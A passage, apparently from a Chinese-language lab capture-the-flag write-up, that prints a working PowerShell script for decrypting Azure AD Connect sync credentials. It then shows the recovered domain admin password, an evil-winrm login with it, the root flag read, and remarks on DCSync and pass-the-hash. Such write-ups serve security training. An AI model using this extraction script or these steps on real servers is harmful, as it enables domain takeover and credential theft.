$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

> 需要改动原 Poc 开头的连接部分，文章中的目标数据库是 LocalDB，而本靶机是 SQL Server。

输出结果：

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> ./exp.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

用 `evil-powershell` 获得域管的 Shell：

```bash
$ evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

在 Desktop 目录中能找到 Root Flag：

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
f4840d**********************
```

> 其实，即使此时获得的是 `MSOL_[HEX]` 用户的凭证，也离 Administrator 不远了。因为该用户拥有 `DS-Replication-Get-Changes` 和 `DS-Replication-Get-Changes-All` 这两个权限，可以做 DCSync，能获得域管的 NT Hash，若允许 PtH，也能 getshell。
